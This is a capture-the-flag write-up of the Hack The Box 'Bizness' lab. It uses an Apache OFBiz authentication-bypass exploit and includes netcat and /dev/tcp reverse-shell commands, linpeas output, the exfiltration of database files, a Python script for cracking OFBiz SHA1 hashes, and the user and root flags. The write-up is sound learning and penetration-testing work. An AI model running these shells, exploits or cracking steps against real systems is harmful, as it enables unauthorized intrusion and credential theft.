---
date: 2024-02-28
title: Bizness HTB Write-Up
machine_ip: 10.10.11.252
os: Linux
difficulty: Easy
my_rating: 4
tags:
  - Web
  - BurpeSuite
  - RCE
references: "[[📚CTF Box Writeups]]"
---

In my first attempt at a live box, many hints were obtained. This easy-listed box was not so easy.

### Enumeration

Begin with a `nmap` scan for all ports using scripts and version tags:

```
-[Tue Feb 27-13:52:38]-[table@parrot]-
-[~]$ nmap -sV -sC -T5 10.10.11.252 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 13:55 PST
Warning: 10.10.11.252 giving up on port because retransmission cap hit (2).
Nmap scan report for bizness.htb (10.10.11.252)
Host is up (0.075s latency).
Not shown: 64877 closed tcp ports (conn-refused), 654 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp   open  ssl/http   nginx 1.18.0
|_http-trane-info: Problem with XML parsing of /evox/about
|_ssl-date: TLS randomness does not represent time
|_http-title: BizNess Incorporated
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|_  http/1.1
35339/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 342.32 seconds

```

I decided to use `msf` to search for exploits relating to nginx, these proved unsuccessful

```
[msf](Jobs:0 Agents:0) >> search nginx

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/linux/http/nginx_chunked_size           2013-05-07       great      Yes    Nginx HTTP Server 1.3.9-1.4.0 Chunked Encoding Stack Buffer Overflow
   1  auxiliary/scanner/http/nginx_source_disclosure                   normal     No     Nginx Source Code Disclosure/Download
   2  exploit/multi/http/php_fpm_rce                  2019-10-22       normal     Yes    PHP-FPM Underflow RCE
   3  exploit/linux/http/roxy_wi_exec                 2022-07-06       excellent  Yes    Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE


Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/http/roxy_wi_exec
```

Since the target machine appears to be running a web server (ports 80 and 443 with nginx running). I attempted to access the website. It returned an error so I confirmed that my `/etc/hosts` had the correct resolutions

`10.10.11.252            bizness.htb`

I then used `whatweb` to enumerate the services on the website

```
-[Tue Feb 27-13:30:41]-[table@parrot]-
-[~]$ whatweb http://bizness.htb/
http://bizness.htb/ [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.252], RedirectLocation[https://bizness.htb/], Title[301 Moved Permanently], nginx[1.18.0]
https://bizness.htb/ [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED][ZZ], Email[info@bizness.htb], HTML5, HTTPServer[nginx/1.18.0], HttpOnly[JSESSIONID], IP[10.10.11.252], JQuery, Lightbox, Script, Title[BizNess Incorporated], nginx[1.18.0]
```

### Web Directory Enumeration

I began with an initial `gobuster` scan:

```
-[Tue Feb 27-13:59:23]-[table@parrot]-
-[~]$ gobuster dir -u  http://10.10.11.252 --wordlist /usr/share/dirb/wordlists/common.txt -b 301
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.252
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   301
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

After trying many variations and omitting the 301 status code, I had no luck. So I tried `dirsearch`:

```
-[Tue Feb 27-14:04:24]-[table@parrot]-
-[~]$ dirsearch -u 10.10.11.252

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/table/.dirsearch/reports/10.10.11.252_24-02-27_14-04-34.txt

Error Log: /home/table/.dirsearch/logs/errors-24-02-27_14-04-34.log

Target: http://10.10.11.252/

[14:04:34] Starting: 
[14:04:53] 301 -  169B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/  ->  https://bizness.htb/examples/jsp/%252e%252e/%252e%252e/manager/html/

Task Completed

```

I had no luck again, so I decided to try a few more tools to enumerate directories. Next was `nikto`:

```
-[Tue Feb 27-14:46:16]-[table@parrot]-
-[~]$ nikto -h http://bizness.htb
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.252
+ Target Hostname:    bizness.htb
+ Target Port:        80
+ Start Time:         2024-02-27 14:46:25 (GMT-8)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: https://bizness.htb/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 7962 requests: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2024-02-27 14:56:51 (GMT-8) (626 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

Same story, so I tried `ffuf`:

```
-[Tue Feb 27-15:03:47]-[table@parrot]-
-[~]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://bizness.htb/FUZZ -t 50 -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bizness.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200
________________________________________________

:: Progress: [4614/4614] :: Job [1/1] :: 639 req/sec :: Duration: [0:00:07] :: Errors: 0 ::


```

And now lets try `wfuzz`:

```
Total time: 34.83259
Processed Requests: 4614
Filtered Requests: 0
Requests/sec.: 132.4621

```

Maybe `dirb` will be the one:

```
-[Tue Feb 27-15:00:35]-[table@parrot]-
-[~]$ dirb http://bizness.htb /usr/share/dirb/wordlists/common.txt  -f

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Feb 27 15:00:43 2024
URL_BASE: http://bizness.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Fine tunning of NOT_FOUND detection

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://bizness.htb/ ----
                                                                                                                            
-----------------
END_TIME: Tue Feb 27 15:06:26 2024
DOWNLOADED: 4612 - FOUND: 0

```

None worked, I knew this was an important step and I was missing something vital by not having the directories enumerated. But I did not want to get a hint just yet.

Browsing around on the website, I noticed Apahce OFBiz Powers the website at the footer. I did some research. It appears that Apache OFBiz is an open source enterprise resource planning (ERP) system. This seems important. So let's google dork for any vulnerabilities.

The first vulnerability I find is CVE-2023-51467. This vulnerability permits attackers to circumvent authentication processes, enabling them to remotely execute arbitrary code (RCE).

{% embed url="https://github.com/Chocapikk/CVE-2023-51467" %}

Following the GitHub installation and usage, I scanned the target and determined it was vulnerable. We can tell this because, in the GitHub instructions, the script returns the Response `PONG` if the target is vulnerable to CVE-2023-51467.

```
-[~/.venv/CVE-2023-51467]$ python exploit.py -u http://bizness.htb
[18:58:49] Vulnerable URL found: http://bizness.htb, Response: PONG                                              exploit.py:53
|████████████████████████████████████████| 1/1 [100%] in 1.1s (0.90/s) 

```

### Initial Foothold - Exploitation

Now that it is vulnerable, I use another GitHub script I found to exploit the vulnerability:

{% embed url="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass" %}

```
[Tue Feb 27-19:08:01]-[table@parrot]-
-[~/Apache-OFBiz-Authentication-Bypass]$ python3 exploit.py --url https://bizness.htb:443 --cmd 'CMD'
[+] Generating payload...
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.

```

In the exploit, I noticed the script was directed to the `/webtools/control/main` in Apache OFBiz. I see this on `https://bizness.htb/webtools/control/main`:

```
    Web Tools Main Page
    default


For something interesting make sure you are logged in, try username: admin, password: ofbiz.

NOTE: If you have not already run the installation data loading script, from the ofbiz home directory run "gradlew loadAll" or "java -jar build/libs/ofbiz.jar -l"

Login

```

The login credentials `admin:ofbiz` does not work, so it is not a default login (I investigated this since I have yet to enumerate all web directories on the target).

Thinking I can use BurpSuite Repeater tab to brute force the login and password. I head there. I of course have no luck and go back to enumerating.

### Web Directory Enumeration Continued

With the new directory discovered through the exploit script, I used `dirbuster`, `dirsearch`, `nikto`, `dirb`, `fuff`, and `wfuzz` again with `/webstools/control/` and nothing was returned as well.

Swallowing my pride and any hope of completing this box without a hint, I asked the HTB community why my directory enumeration was not working. After a minor hint, here is the TRUE way to use Dirsearch:

```
-[~]$ dirsearch -u https://bizness.htb/ --exclude-status 403,404,500,502,400,401

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/table/.dirsearch/reports/bizness.htb/-_24-02-27_19-31-40.txt

Error Log: /home/table/.dirsearch/logs/errors-24-02-27_19-31-40.log

Target: https://bizness.htb/

[19:31:40] Starting: 
[19:31:50] 302 -    0B  - /accounting  ->  https://bizness.htb/accounting/
[19:31:57] 302 -    0B  - /catalog  ->  https://bizness.htb/catalog/
[19:31:58] 302 -    0B  - /common  ->  https://bizness.htb/common/
[19:31:58] 302 -    0B  - /content  ->  https://bizness.htb/content/
[19:31:58] 302 -    0B  - /content/debug.log  ->  https://bizness.htb/content/control/main
[19:31:58] 302 -    0B  - /content/  ->  https://bizness.htb/content/control/main
[19:31:59] 200 -   34KB - /control
[19:31:59] 200 -   34KB - /control/
[19:32:01] 302 -    0B  - /error  ->  https://bizness.htb/error/;jsessionid=C12B0E82503A29488FA406B5A2B35958.jvm1
[19:32:01] 302 -    0B  - /example  ->  https://bizness.htb/example/
[19:32:03] 302 -    0B  - /images  ->  https://bizness.htb/images/
[19:32:04] 302 -    0B  - /index.jsp  ->  https://bizness.htb/control/main
[19:32:04] 200 -   27KB - /index.html
[19:32:13] 200 -   21B  - /solr/admin/file/?file=solrconfig.xml
[19:32:14] 200 -   21B  - /solr/admin/

Task Completed

```

Now that we have our directories, let's go back to figuring out how to log in. Returning to jakabakos exploit, since that is what seemed to work, I changed the command that is called.

It was at this point that I realized that I got lost in the rabbit hole and didn't think about using `netcat`... Let's do that now!

First, I set a `netcat` listener:

```
[Wed Feb 28-09:01:19]-[table@parrot]-
-[~/Apache-OFBiz-Authentication-Bypass]$ nc -lnvp 8443
listening on [any] 8443 ...
```

Now I exploit and create a reverse shell to `nc` listener on 8443:

```
-[Wed Feb 28-12:52:40]-[table@parrot]-
-[~/Apache-OFBiz-Authentication-Bypass]$ python3 exploit.py --url https://bizness.htb:443 --cmd 'nc 10.10.14.83 8443 -e /bin/bash'
[+] Generating payload...
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.

```

Success:

```
-[Wed Feb 28-09:01:19]-[table@parrot]-
-[~/Apache-OFBiz-Authentication-Bypass]$ nc -lnvp 8443
listening on [any] 8443 ...
connect to [10.10.14.83] from (UNKNOWN) [10.10.11.252] 58330
whoami
ofbiz

```

I then upgraded the shell:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ofbiz@bizness:/opt/ofbiz$ 
```

Search and find user flag.txt:&#x20;

```
ofbiz@bizness:/opt/ofbiz$ cd /home
cd /home
ofbiz@bizness:/home$ ls
ls
ofbiz
ofbiz@bizness:/home$ cd ofbiz	
cd ofbiz
ofbiz@bizness:~$ ls
ls
user.txt
ofbiz@bizness:~$ cat user.txt
cat user.txt
cf63f09a58c171c627576ba93f3c4b0f
```

User flag = <mark style="background-color:green;">cf63f09a58c171c627576ba93f3c4b0f</mark>

### Privilege Escalation

Many useful scripts for determining how to escalate privileges can be found online, I decided to use `linpeas`. To get `linpeas` on the remote host, after downloading the script from GitHub:

{% embed url="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" %}

I then spin up a web server on my local machine at port 8080:

```
-[Wed Feb 28-09:39:42]-[table@parrot]-
-[~]$ sudo python3 -m http.server 8080
[sudo] password for table: 
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

On the remote host, I try to get the script on my local machine through that web server. Turns out, I do not have permission to `wget linpeas.sh` :

```
ofbiz@bizness:/home$ wget http://10.10.14.83:8080/linpeas.sh
wget http://10.10.14.83:8080/linpeas.sh
--2024-02-28 12:39:55--  http://10.10.14.83:8080/linpeas.sh
Connecting to 10.10.14.83:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 860549 (840K) [text/x-sh]
linpeas.sh: Permission denied

Cannot write to ‘linpeas.sh’ (Permission denied).

```

I figured out this was because I was using `wget` in the `/` directory, when I only have permission to `wget` in `/home/ofbiz` directory:

```
ofbiz@bizness:~$ wget http://10.10.14.83:8080/linpeas.sh
wget http://10.10.14.83:8080/linpeas.sh
--2024-02-28 12:50:11--  http://10.10.14.83:8080/linpeas.sh
Connecting to 10.10.14.83:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 860549 (840K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 840.38K   899KB/s    in 0.9s    

2024-02-28 12:50:14 (899 KB/s) - ‘linpeas.sh’ saved [860549/860549]

```

The web server shows successful `wget` of `linpeas`:

```
-[Wed Feb 28-09:39:42]-[table@parrot]-
-[~]$ sudo python3 -m http.server 8080
[sudo] password for table: 
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.252 - - [28/Feb/2024 09:50:14] "GET /linpeas.sh HTTP/1.1" 200 -

```

To use the script, we must make the script executable:

```
ofbiz@bizness:~$ chmod +x linpeas.sh
chmod +x linpeas.sh
ofbiz@bizness:~$ ls
ls
linpeas.sh  user.txt
ofbiz@bizness:~$ ./linpeas.sh

```

Running the `linpeas.sh` script, I can find out basic information about the Linux target machine and also any useful information to escalate to the root. Based on the highlights in the results, `.service` files are listed as a 95% chance to PE (privilege escalate):

```
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
You can't write on systemd PATH

```

Checking the provided link, HackTricks shows an exploit for writeable `.service` files:

> Check if you can write any .service file, if you can, you could modify it so it executes your backdoor when the service is started, restarted or stopped (maybe you will need to wait until the machine is rebooted). For example create your backdoor inside the .service file with ExecStart=/tmp/script.sh

```
Type=simple
User=root
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.83/4444 0>&1"
```

I attempted to add the above code to the bottom of the `gradlew` file being called by `ofbiz.service`. Without any way to `systemctl restart` that service, I could not get that code to execute.

After more unstructured attempts, I decided I needed another hint. I was going the wrong way. I was told to revise the `linpeas` output

Within the exploits section, I decided to check those:

```
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops

   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
   Exposure: probable
   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ub
untu=21.04{kernel:5.11.0-16-*}
   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: ubuntu=(20.04|21.04),[ debian=11 ]
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded


```

These exploits were older and less likely to work. After trying some of them anyway and combing through the system, I decided to get another hint. The hint was that it is a lot of reading. So back to combing through the files.

Eventually, I found the `AdminLoginUserData.xml` file with a promising hash for the admin:

```
/opt/ofbiz/framework/resources/templates$ cat AdminUserLoginData.xml    
<?xml version="1.0" encoding="UTF-8"?>
<!--
Licensed to the Apache Software Foundation (ASF) under one
or more contributor license agreements.  See the NOTICE file
distributed with this work for additional information
regarding copyright ownership.  The ASF licenses this file
to you under the Apache License, Version 2.0 (the
"License"); you may not use this file except in compliance
with the License.  You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing,
software distributed under the License is distributed on an
"AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
KIND, either express or implied.  See the License for the
specific language governing permissions and limitations
under the License.
-->

<entity-engine-xml>
    <UserLogin userLoginId="@userLoginId@" currentPassword="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a" requirePasswordChan
ge="Y"/>
    <UserLoginSecurityGroup groupId="SUPER" userLoginId="@userLoginId@" fromDate="2001-01-01 12:00:00.0"/>

```

I saved the hash to a file called `hash.txt` to use `hashcat` to crack the password. Unable to crack it, I researched other ways to crack the hash and determine if it was salted or not. With no luck, I was eager for yet another hint.

To proceed I needed to do more research on the different technologies that are identified via the names of directories. I finally come across Derby, but what is that?

* **Apache Derby** is an open-source database management system (RDBMS) that is implemented in Java

Databases are always interesting as they hold sensitive information. So, I enumerate sensitive information from the `.dat` files within the derby directory by copying all `.dat` files into a `.txt` :

```
cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/* > dat_files.txt
```

I need to get the `dat_files.txt` onto the local machine by setting a simple web server on rhost:

```
ofbiz@bizness:~$ python3 -m http.server 8484
python3 -m http.server 8484
Serving HTTP on 0.0.0.0 port 8484 (http://0.0.0.0:8484/) ...
10.10.14.83 - - [28/Feb/2024 17:15:17] "GET /dat_files.txt HTTP/1.1" 200 -
```

Now, I grab them using `wget` on lhost:

```
-[Wed Feb 28-14:14:44]-[table@parrot]-
-[~]$ wget http://10.10.11.252:8484/dat_files.txt
--2024-02-28 14:15:17--  http://10.10.11.252:8484/dat_files.txt
Connecting to 10.10.11.252:8484... connected.
HTTP request sent, awaiting response... 200 OK
Length: 65917461 (63M) [text/plain]
Saving to: ‘dat_files.txt’

dat_files.txt                   100%[=====================================================>]  62.86M  15.7MB/s    in 5.5s    

2024-02-28 14:15:22 (11.3 MB/s) - ‘dat_files.txt’ saved [65917461/65917461]
```

Now that we have a copy of the `.dat` files on our local host, let's see if we can find anything interesting with `strings`

```
-[Wed Feb 28-14:15:22]-[table@parrot]-
-[~]$ strings dat_files.txt | grep SHA
SHA-256
MARSHALL ISLANDS
SHAREHOLDER
SHAREHOLDER
                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
```

That's it! We found the hashed Admin password. I try to crack it again with `hashcat`. I had no luck cracking the hash, so I had to get yet another hint. The hint was not helpful and I spent many more hours on this.

Eventually, I came across a writeup and I referenced the parts I needed to fuel up and keep moving. I found this GitHub that shows `HashCrypt.java` functions:

{% embed url="https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java" %}

Again, I was stuck so I followed the write-up and used a Python script to encrypt each line in `rockyou.txt` and compare it to the hash:

```
import hashlib
import base64
import os
from tqdm import tqdm

class PasswordEncryptor:
    def __init__(self, hash_type="SHA", pbkdf2_iterations=10000):
        """
        Initialize the PasswordEncryptor object with a hash type and PBKDF2 iterations.

        :param hash_type: The hash algorithm to use (default is SHA).
        :param pbkdf2_iterations: The number of iterations for PBKDF2 (default is 10000).
        """
        self.hash_type = hash_type
        self.pbkdf2_iterations = pbkdf2_iterations

    def crypt_bytes(self, salt, value):
        """
        Crypt a password using the specified hash type and salt.

        :param salt: The salt used in the encryption.
        :param value: The password value to be encrypted.
        :return: The encrypted password string.
        """
        if not salt:
            salt = base64.urlsafe_b64encode(os.urandom(16)).decode('utf-8')
        hash_obj = hashlib.new(self.hash_type)
        hash_obj.update(salt.encode('utf-8'))
        hash_obj.update(value)
        hashed_bytes = hash_obj.digest()
        result = f"${self.hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"
        return result

    def get_crypted_bytes(self, salt, value):
        """
        Get the encrypted bytes for a password.

        :param salt: The salt used in the encryption.
        :param value: The password value to get encrypted bytes for.
        :return: The encrypted bytes as a string.
        """
        try:
            hash_obj = hashlib.new(self.hash_type)
            hash_obj.update(salt.encode('utf-8'))
            hash_obj.update(value)
            hashed_bytes = hash_obj.digest()
            return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')
        except hashlib.NoSuchAlgorithmException as e:
            raise Exception(f"Error while computing hash of type {self.hash_type}: {e}")

# Example usage:
hash_type = "SHA1"
salt = "d"
search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I="
wordlist = '/usr/share/wordlists/rockyou.txt'

# Create an instance of the PasswordEncryptor class
encryptor = PasswordEncryptor(hash_type)

# Get the number of lines in the wordlist for the loading bar
total_lines = sum(1 for _ in open(wordlist, 'r', encoding='latin-1'))

# Iterate through the wordlist with a loading bar and check for a matching password
with open(wordlist, 'r', encoding='latin-1') as password_list:
    for password in tqdm(password_list, total=total_lines, desc="Processing"):
        value = password.strip()
        
        # Get the encrypted password
        hashed_password = encryptor.crypt_bytes(salt, value.encode('utf-8'))
        
        # Compare with the search hash
        if hashed_password == search:
            print(f'Found Password:{value}, hash:{hashed_password}')
            break  # Stop the loop if a match is found

```

I then enabled it to execute with `chmod +x`:

```
-[Wed Feb 28-14:22:41]-[table@parrot]-
-[~]$ python3 hashscript.py 
Processing:  10%|██████▎                                                       | 1451109/14344392 [00:01<00:13, 937919.46it/s]Found Password:monkeybizness, hash:$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=
Processing:  10%|██████▍                                                       | 1478437/14344392 [00:01<00:13, 944059.79it/s]

```

We got the plaintext password! Now let's `su root` and find the flag:

```
ofbiz@bizness:/opt/ofbiz$ su root
su root
Password: monkeybizness

root@bizness:/opt/ofbiz# cd /root
cd /root
root@bizness:~# ls
ls
root.txt
root@bizness:~# cat root.txt
cat root.txt
76603510ff7d01c18426619a4f002fd9

```

Root flag = <mark style="background-color:green;">76603510ff7d01c18426619a4f002fd9</mark>

I am glad I searched for a heavy hint as I am still green to penetration testing and I still learned so much with this box. I look forward to doing more and eventually completing the box without any hints.
